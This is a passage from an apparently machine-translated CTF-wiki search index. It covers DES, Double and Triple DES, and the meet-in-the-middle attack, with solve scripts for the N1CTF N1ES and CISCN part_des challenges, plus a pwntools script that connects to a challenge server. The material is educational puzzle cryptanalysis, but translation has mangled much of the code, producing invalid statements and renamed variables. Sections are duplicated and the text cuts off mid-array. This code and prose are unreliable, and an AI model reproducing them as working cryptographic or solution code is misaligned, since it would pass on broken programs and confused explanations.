: - 1 ] c . recvuntil ( ':' ) found = iters . bruteforce ( lambda x : sha256 ( x + post ) . hexdigest () == tar , string . ascii_letters + string . digits , 4 ) c . sendline ( found ) #c = remote('127.0.0.1',10001) c = remote ( '47.75.4.252' , 10001 ) doped () pt = 'GoodCipher' def doswap ( a , b ): if a == b : return if a > b : tmp = b b = a a = tmp years = [] ans . append (( 0.256 - a )) b -= a a = 0 while b != 1 : tmp = 0 lo = 1 while b & lo == 0 : what & lt ; & lt ; = 1 tmp += 1 if b == lo : ans . append (( 1 , 8 - tmp )) break if tmp != 0 : ans . append (( 1 , 8 - tmp )) b >>= tmp ans . append (( 2 , 1 )) b ^= 1 ans . append (( 0.255 )) b -= 1 ans . append (( 0.254 )) for a , b in ans : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in [( 0 , 2 ),( 1 , 7 ),( 0 , 255 ),( 1 , 1 )]: c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in ans [:: - 1 ]: if a == 0 : c . sendline ( ' %d %d ' % ( a , 256 - b )) elif a == 1 : c . sendline ( ' %d %d ' % ( a , 8 - b )) elif a == 2 : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for i in range ( 3 ): print i m = range ( 256 ) c . recvuntil ( 'ciphertext is ' ) ct = c . recvline () . strip () ct = ct . decode ( 'hex' ) assert len ( ct ) == 10 for i in range ( 10 ): a = ord ( ct [ i ]) b = ord ( pt [ i ]) #print m[a],b doswap ( m [ a ], b ) for j in range ( 256 ): if m [ j ] == b : m [ j ] = m [ a ] m [ a ] = b break c . sendline ( '-1' ) c . recvuntil ( 'Your flag here. \\n ' ) print c . recvline ()","title":"Problem Solving"},{"location":"crypto/blockcipher/des/","text":"DES \u00b6 basic introduction \u00b6 Data Encryption Standard (DES), a data encryption standard, is a typical block encryption. The basic information is as follows: Enter 64 bits. Output 64 bits. The key is 64 bits, using 56 bits of the 64-bit key, and the remaining 8 bits are either discarded or used as parity bits. Feistel iterative structure The plaintext is ciphered after 16 iterations. The ciphertext is plaintext after a similar 16 iterations. Basic Process \u00b6 Give a simple [DES Flowchart] ( http://homepage.usask.ca/~dtr467/400/ ). Encryption \u00b6 We can consider each round of encryption process L_{i+1}=R_i L_{i+1}=R_i R_{i+1}=L_i\\oplus F(R_i,K_i) R_{i+1}=L_i\\oplus F(R_i,K_i) Then before the last Permutation, the corresponding ciphertext is (R_{n+1}, L_{n+1}) (R_{n+1}, L_{n+1}) . Decryption \u00b6 So how does decryption decrypt it? First, we can reverse the ciphertext first, then we can get the final round of output. We will consider each round at this time. R_i=L_{i+1} R_i=L_{i+1} L_i=R_{i+1}\\oplus F(L_{i+1},K_i) L_i=R_{i+1}\\oplus F(L_{i+1},K_i) Therefore, (L_0,R_0) (L_0,R_0) is the plaintext after the first replacement when encrypting. We only need to perform the inverse permutation to get the plaintext. It can be seen that DES encryption and decryption uses the same set of logic, except that the order in which the keys are used is inconsistent. Core components \u00b6 The core components in DES mainly include (only the encryption process is given here) initial replacement F function E extension function S box, design criteria not given. P replacement Last replacement Where the F function is as follows If you are more interested in DES, you can study it more closely. Welcome to PR. derivative \u00b6 Based on DES, the following two encryption methods are derived. Double DES Three DES Dual DES \u00b6 Dual DES uses two keys and is 112 bits long. Encryption method is as follows $ C = E_ {k2} (E_ {k1} (P)) $ But dual DES can't resist the middle encounter attack, we can construct the following two sets $ I = {E_ {k1} (P)} $ J=D_{k2}(C) J=D_{k2}(C) That is, respectively enumerate K1 and K2 to encrypt P and decrypt C respectively. After we encrypt P, we can sort the encryption results. The complexity is 2^nlog(2^n)=O(n2^n) 2^nlog(2^n)=O(n2^n) When we decrypt C, we can go to the corresponding table for each decryption. The total complexity is still O(n2^n) O(n2^n) . Triple DES \u00b6 Triple DES encryption and decryption methods are as follows C=E_{k3}(D_{k2}(E_{k1}(P))) C=E_{k3}(D_{k2}(E_{k1}(P))) P=D_{k1}(E_{k2}(D_{k3}(C))) P=D_{k1}(E_{k2}(D_{k3}(C))) There are two ways to choose a key. 3 different keys, k1, k2, k3 are independent of each other, a total of 168 bits. 2 different keys, k1 and k2 are independent, k3 = k1, 112 bits. Attack method \u00b6 Differential attack Linear attack 2018 N1CTF N1ES \u00b6 The basic code is as follows # -*- coding: utf-8 -*- def round_add ( a , b ): f = lambda x , y : x + y - 2 * ( x & y ) true = & #39;&#39; for i in range ( len ( a )): res + = chr ( f ( words ( a [ i ]), words ( b [ i ]))) return res def permutate ( table , block ): return list ( map ( lambda x : block [ x ], table )) def string_to_bits ( data ): data = [ ord ( c ) for c in data ] l = len ( data ) * 8 result = [ 0 ] * l post = 0 for ch in data : for i in range ( 0 , 8 ): result [( pos << 3 ) + i ] = ( ch >> i ) & 1 post + = 1 return result s_box = [ 54 , 132 , 138 , 83 , 16 , 73 , 187 , 84 , 146 , 30 , 95 , 21 , 148 , 63 , 65 , 189 , 188 , 151 , 72 , 161 , 116 , 63 , 161 , 91 , 37 , 24 , 126 , 107 , 87 , 30 , 117 , 185 , 98 , 90 , 0 , 42 , 140 , 70 , 86 , 0 , 42 , 150 , 54 , 22 , 144 , 153 , 36 , 90 , 149 , 54 , 156 , 8 , 59 , 40 , 110 , 56 , 1 , 84 , 103 , 22 , 65 , 17 , 190 , 41 , 99 , 151 , 119 , 124 , 68 , 17 , 166 , 125 , 95 , 65 , 105 , 133 , 49 , 19 , 138 , 29 , 110 , 7 , 81 , 134 , 70 , 87 , 180 , 78 , 175 , 108 , 26 , 121 , 74 , 29 , 68 , 162 , 142 , 177 , 143 , 86 , 129 , 101 , 117 , 41 , 57 , 34 , 177 , 103 , 61 , 135 , 191 , 74 , 69 , 147 , 90 , 49 , 135 , 124 , 106 , 19 , 8 9 , 38 , 21 , 41 , 17 , 155 , 83 , 38 , 159 , 179 , 19 , 157 , 68 , 105 , 151 , 166 , 171 , 122 , 179 , 114 , 52 , 183 , 89 , 107 , 113 , 65 , 161 , 141 , 18 , 121 , 95 , 4 , 95 , 101 , 81 , 156 , 17 , 190 , 38 , 84 , 9 , 171 , 180 , 59 , 45 , 15 , 34 , 89 , 75 , 164 , 190 , 140 , 6 , 41 , 188 , 77 , 165 , 105 , 5 , 107 , 31 , 183 , 107 , 141 , 66 , 63 , 10 , 9 , 125 , 50 , 2 , 153 , 156 , 162 , 186 , 76 , 158 , 153 , 117 , 9 , 77 , 156 , 11 , 145 , 12 , 169 , 52 , 57 , 161 , 7 , 158 , 110 , 191 , 43 , 82 , 186 , 49 , 102 , 166 , 31 , 41 , 5 , 189 , 27 ] def generate ( o ): k = permutate ( s_box , o ) b = [] for i in range ( 0 , len ( k ), 7 ): b . append ( k [ i : i + 7 ] + [ 1 ]) c = [] for i in range ( 32 ): post = 0 x = 0 for j in b [ i ]: x += ( j << pos ) post + = 1 c . append (( 0x10001 ** x ) % ( 0x7f )) return c class N1ES : def __init__ ( self , key ): if ( len ( key ) != 24 or isinstance ( key , bytes ) == False ): raise Exception ( \"key must be 24 bytes long\" ) self . key = key self . gen_subkey () def gen_subkey ( self ): o = string_to_bits ( self . key ) k = [] for i in range ( 8 ): o = generate ( o ) k . extend ( o ) o = string_to_bits ([ chr ( c ) for c in o [ 0 : 24 ]]) self . Kn = [] for i in range ( 32 ): self . Kn . append ( map ( chr , k [ i * 8 : i * 8 + 8 ])) return def encrypt ( self , plaintext ): if ( len ( plaintext ) % 16 != 0 or isinstance ( plaintext , bytes ) == False ): raise Exception ( \"plaintext must be a multiple of 16 in length\" ) true = & #39;&#39; for i in range ( len ( plaintext ) / 16 ): block = plaintext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ round_cnt ])) L , R = R , L res += L + R return res Obviously, we can think of it as a way of Feistel encryption, the decryption function is as follows def decrypt ( self , ciphertext ): true = & #39;&#39; for i in range ( len ( ciphertext ) / 16 ): block = ciphertext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ 31 - round_cnt ])) L , R = R , L res += L + R return res The final result is \u279c baby_N1ES cat challenge.py from N1ES import N1ES import base64 key = \"wxy191iss00000000000cute\" n1es = N1ES ( key ) flag = \"N1CTF{*****************************************}\" cipher = n1es.encrypt ( flag ) #print base64.b64encode(cipher) # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx cipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx' cipher = base64.b64decode ( cipher ) print n1es.decrypt ( cipher ) \u279c baby_N1ES python challenge.py N1CTF { F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d _ / - / } 2019 CISCN part_des \u00b6 The title only gave one file: Round n part_encode-> 0x92d915250119e12b Key map -> 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84 Considering the title name and data characteristics, Round n part_encode is the intermediate result of executing n rounds of des, and Key map should be the subkey of des. To restore the plaintext, only the reverse process of n rounds of des encryption can be performed. Pay attention to the following three points when decrypting. Subkey selection, for only n rounds of encryption results, the decryption should use the keys n, n-1..., 1 in sequence. des After the last round of operations, the unfinished des does not exchange the left and right parts and the inverse initial permutation, so we should perform these two steps on the ciphertext first. n choice, in this question, we don't know n, but it doesn't matter, we can try all possible values (0-15) flag should be ascii string. ??? note \"Solution code\" ``` python kkk = 16 def bit_rot_left(lst, pos): return lst[pos:] + lst[:pos] class DES: IP = [ 58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8, 57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7 ] IP_re = [ 40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25 ] Pbox = [ 16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10, 2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25 ] E = [ 32,1,2,3,4,5,4,5,6,7,8,9, 8,9,10,11,12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21,22,23,24,25, 24,25,26,27,28,29,28,29,30,31,32,1 ] PC1 = [ 57,49,41,33,25,17,9,1,58,50,42,34,26,18, 10,2,59,51,43,35,27,19,11,3,60,52,44,36, 63,55,47,39,31,23,15,7,62,54,46,38,30,22, 14,6,61,53,45,37,29,21,13,5,28,20,12,4 ] PC2 = [ 14,17,11,24,1,5,3,28,15,6,21,10, 23,19,12,4,26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40,51,45,33,48, 44,49,39,56,34,53,46,42,50,36,29,32 ] Sbox = [ [ [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7], [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8], [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0], [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], ], [ [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10], [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5], [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15], [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], ], [ [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8], [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1], [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7], [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], ], [ [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15], [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9], [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4], [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], ], [ [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9], [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6], [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14], [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], ], [ [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11], [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8], [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6], [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], ], [ [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1], [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6], [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2], [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], ], [ [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7], [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2], [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8], [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11], ] ] rout = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1] def __init__(self): self.subkey = [[[1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0]], [[1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1]]] def permute(self, lst, tb): return [lst[i-1] for i in tb] def f(self,riti,subkeyi): tmp = [i^j for i,j in zip(subkeyi,self.permute(riti,DES.E))] return self.permute(sum([[int(l) for l in str(bin(DES.Sbox[i][int(str(tmp[6*i])+str(tmp[6*i+5]),2)][int(\"\".join(str(j) for j in tmp[6*i+1:6*i+5]),2)])[2:].zfill(4))] for i in range(8)],[]),DES.Pbox) def des_main(self,m,mark): sbkey = self.subkey[0] #if mark == 'e' else self.subkey[1] # tmp = self.permute([int(i) for i in list((m).ljust(64,\"0\"))],self.IP) tmp = [int(i) for i in list((m).ljust(64,\"0\"))] global kkk print (kkk) for i in range(kkk): tmp = tmp[32:] + [j^k for j,k in zip(tmp[:32],self.f(tmp[32:],sbkey[i if mark != 'd' else kkk-1-i]))] return \"\".join([str(i) for i in self.permute(tmp[32:]+tmp[:32],self.IP_re)]) def des_encipher(self,m): m = \"\".join([bin(ord(i))[2:].zfill(8) for i in m]) des_en = self.des_main (m, 'e') return \"\".join([chr(int(des_en[i 8:i 8+8],2)) for i in range(8)]) def des_decipher(self,c): c = \"\".join([bin(ord(i))[2:].zfill(8) for i in c]) des_de = self.des_main (c, 'd') return \"\".join([chr(int(des_de[i 8:i 8+8],2)) for i in range(8)]) def test(): import base64 global kkk while kkk >=0: desobj = DES () # cipher = desobj.des_encipher(\"12345678\") cipher = '\\x01\\x19\\xe1+\\x92\\xd9\\x15%' message1 = desobj.des_decipher(cipher) print(message1) kkk = 1 if name ==' main ': test() ``` Decryption result (partial): 14 t-\u00cfE\u00cfx\u0090\u00a7 13 y0ur9Ood 12 \u03bcp ^ \u00db\u00e9 = \u00b9 11 ) \u00c1`r\u00fb\u00d5\u00fb It can be seen that n is 13, and flag is flag{y0ur9Ood} Reference \u00b6 Tsinghua University graduate data security courseware - https://en.wikipedia.org/wiki/Data_Encryption_Standard","title":"DES"},{"location":"crypto/blockcipher/des/#des","text":"","title":"DES"},{"location":"crypto/blockcipher/des/#basic-introduction","text":"Data Encryption Standard (DES), a data encryption standard, is a typical block encryption. The basic information is as follows: Enter 64 bits. Output 64 bits. The key is 64 bits, using 56 bits of the 64-bit key, and the remaining 8 bits are either discarded or used as parity bits. Feistel iterative structure The plaintext is ciphered after 16 iterations. The ciphertext is plaintext after a similar 16 iterations.","title":"basic introduction"},{"location":"crypto/blockcipher/des/#basic-process","text":"Give a simple [DES Flowchart] ( http://homepage.usask.ca/~dtr467/400/ ).","title":"Basic Process"},{"location":"crypto/blockcipher/des/#encryption","text":"We can consider each round of encryption process L_{i+1}=R_i L_{i+1}=R_i R_{i+1}=L_i\\oplus F(R_i,K_i) R_{i+1}=L_i\\oplus F(R_i,K_i) Then before the last Permutation, the corresponding ciphertext is (R_{n+1}, L_{n+1}) (R_{n+1}, L_{n+1}) .","title":"Encryption"},{"location":"crypto/blockcipher/des/#decryption","text":"So how does decryption decrypt it? First, we can reverse the ciphertext first, then we can get the final round of output. We will consider each round at this time. R_i=L_{i+1} R_i=L_{i+1} L_i=R_{i+1}\\oplus F(L_{i+1},K_i) L_i=R_{i+1}\\oplus F(L_{i+1},K_i) Therefore, (L_0,R_0) (L_0,R_0) is the plaintext after the first replacement when encrypting. We only need to perform the inverse permutation to get the plaintext. It can be seen that DES encryption and decryption uses the same set of logic, except that the order in which the keys are used is inconsistent.","title":"Decryption"},{"location":"crypto/blockcipher/des/#core-components","text":"The core components in DES mainly include (only the encryption process is given here) initial replacement F function E extension function S box, design criteria not given. P replacement Last replacement Where the F function is as follows If you are more interested in DES, you can study it more closely. Welcome to PR.","title":"Core components"},{"location":"crypto/blockcipher/des/#derivative","text":"Based on DES, the following two encryption methods are derived. Double DES Three DES","title":"derivative"},{"location":"crypto/blockcipher/des/#dual-des","text":"Dual DES uses two keys and is 112 bits long. Encryption method is as follows $ C = E_ {k2} (E_ {k1} (P)) $ But dual DES can't resist the middle encounter attack, we can construct the following two sets $ I = {E_ {k1} (P)} $ J=D_{k2}(C) J=D_{k2}(C) That is, respectively enumerate K1 and K2 to encrypt P and decrypt C respectively. After we encrypt P, we can sort the encryption results. The complexity is 2^nlog(2^n)=O(n2^n) 2^nlog(2^n)=O(n2^n) When we decrypt C, we can go to the corresponding table for each decryption. The total complexity is still O(n2^n) O(n2^n) .","title":"Dual DES"},{"location":"crypto/blockcipher/des/#triple-des","text":"Triple DES encryption and decryption methods are as follows C=E_{k3}(D_{k2}(E_{k1}(P))) C=E_{k3}(D_{k2}(E_{k1}(P))) P=D_{k1}(E_{k2}(D_{k3}(C))) P=D_{k1}(E_{k2}(D_{k3}(C))) There are two ways to choose a key. 3 different keys, k1, k2, k3 are independent of each other, a total of 168 bits. 2 different keys, k1 and k2 are independent, k3 = k1, 112 bits.","title":"Triple DES"},{"location":"crypto/blockcipher/des/#attack-method","text":"Differential attack Linear attack","title":"Attack method"},{"location":"crypto/blockcipher/des/#2018-n1ctf-n1es","text":"The basic code is as follows # -*- coding: utf-8 -*- def round_add ( a , b ): f = lambda x , y : x + y - 2 * ( x & y ) true = & #39;&#39; for i in range ( len ( a )): res + = chr ( f ( words ( a [ i ]), words ( b [ i ]))) return res def permutate ( table , block ): return list ( map ( lambda x : block [ x ], table )) def string_to_bits ( data ): data = [ ord ( c ) for c in data ] l = len ( data ) * 8 result = [ 0 ] * l post = 0 for ch in data : for i in range ( 0 , 8 ): result [( pos << 3 ) + i ] = ( ch >> i ) & 1 post + = 1 return result s_box = [ 54 , 132 , 138 , 83 , 16 , 73 , 187 , 84 , 146 , 30 , 95 , 21 , 148 , 63 , 65 , 189 , 188 , 151 , 72 , 161 , 116 , 63 , 161 , 91 , 37 , 24 , 126 , 107 , 87 , 30 , 117 , 185 , 98 , 90 , 0 , 42 , 140 , 70 , 86 , 0 , 42 , 150 , 54 , 22 , 144 , 153 , 36 , 90 , 149 , 54 , 156 , 8 , 59 , 40 , 110 , 56 , 1 , 84 , 103 , 22 , 65 , 17 , 190 , 41 , 99 , 151 , 119 , 124 , 68 , 17 , 166 , 125 , 95 , 65 , 105 , 133 , 49 , 19 , 138 , 29 , 110 , 7 , 81 , 134 , 70 , 87 , 180 , 78 , 175 , 108 , 26 , 121 , 74 , 29 , 68 , 162 , 142 , 177 , 143 , 86 , 129 , 101 , 117 , 41 , 57 , 34 , 177 , 103 , 61 , 135 , 191 , 74 , 69 , 147 , 90 , 49 , 135 , 124 , 106 , 19 , 8 9 , 38 , 21 , 41 , 17 , 155 , 83 , 38 , 159 , 179 , 19 , 157 , 68 , 105 , 151 , 166 , 171 , 122 , 179 , 114 , 52 , 183 , 89 , 107 , 113 , 65 , 161 , 141 , 18 , 121 , 95 , 4 , 95 , 101 , 81 , 156 , 17 , 190 , 38 , 84 , 9 , 171 , 180 , 59 , 45 , 15 , 34 , 89 , 75 , 164 , 190 , 140 , 6 , 41 , 188 , 77 , 165 , 105 , 5 , 107 , 31 , 183 , 107 , 141 , 66 , 63 , 10 , 9 , 125 , 50 , 2 , 153 , 156 , 162 , 186 , 76 , 158 , 153 , 117 , 9 , 77 , 156 , 11 , 145 , 12 , 169 , 52 , 57 , 161 , 7 , 158 , 110 , 191 , 43 , 82 , 186 , 49 , 102 , 166 , 